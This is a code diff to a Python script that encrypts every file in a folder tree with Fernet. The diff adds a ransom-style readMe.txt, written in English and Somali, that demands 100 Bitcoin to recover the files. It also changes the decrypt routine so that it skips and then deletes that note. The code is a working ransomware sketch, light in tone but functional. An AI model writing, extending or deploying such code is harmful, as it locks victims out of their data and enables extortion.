@@ -46,6 +46,13 @@ def encrypt_folder(folder_path):
             file_path = os.path.join(root, file)
             encrypt_file(file_path, fernet)
 
+    # Create readMe.txt file
+    readme_path = os.path.join(folder_path, "readMe.txt")
+    with open(readme_path, "w", encoding="utf-8") as readme_file:
+        readme_file.write("All files in this folder have been encrypted.\nWaarya hadaad rabto inaad files kaaga aad dib u hesho soo dir 100 BitCoin! 😂")
+
+    print(f"Created readMe.txt in {folder_path}")
+
 # Decrypt all files in a folder
 def decrypt_folder(folder_path):
     key = load_key()
@@ -54,7 +61,15 @@ def decrypt_folder(folder_path):
     for root, dirs, files in os.walk(folder_path):
         for file in files:
             file_path = os.path.join(root, file)
+            if file == "readMe.txt":
+                continue
             decrypt_file(file_path, fernet)
+
+    # Delete the readMe.txt file
+    readme_path = os.path.join(folder_path, "readMe.txt")
+    if os.path.exists(readme_path):
+        os.remove(readme_path)
+        print(f"Deleted readMe.txt from {folder_path}")
 
 def main():
     while True:
